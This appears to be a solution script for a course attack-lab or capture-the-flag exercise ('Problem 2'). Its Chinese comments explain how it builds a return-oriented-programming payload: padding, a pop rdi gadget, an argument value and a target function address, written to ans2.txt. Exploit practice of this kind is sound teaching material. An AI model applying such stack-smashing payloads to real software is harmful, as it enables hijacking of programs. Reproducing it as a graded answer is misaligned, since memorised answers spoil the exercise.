import struct

# 1. 填充 16 字节到达返回地址
padding = b"A" * 16

# 2. Pop RDI gadget 地址 (0x4012c7)
pop_rdi = struct.pack("<Q", 0x4012c7)

# 3. 我们想要传给 func2 的参数值 (0x3f8)
arg1 = struct.pack("<Q", 0x3f8)

# 4. func2 的起始地址 (0x401216)
func2_addr = struct.pack("<Q", 0x401216)

# 组合 ROP 链
# 流程：函数退出 -> 执行 pop_rdi (把 0x3f8 读入 rdi) -> 执行 ret (跳转到 func2)
payload = padding + pop_rdi + arg1 + func2_addr

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Problem 2 Payload generated!")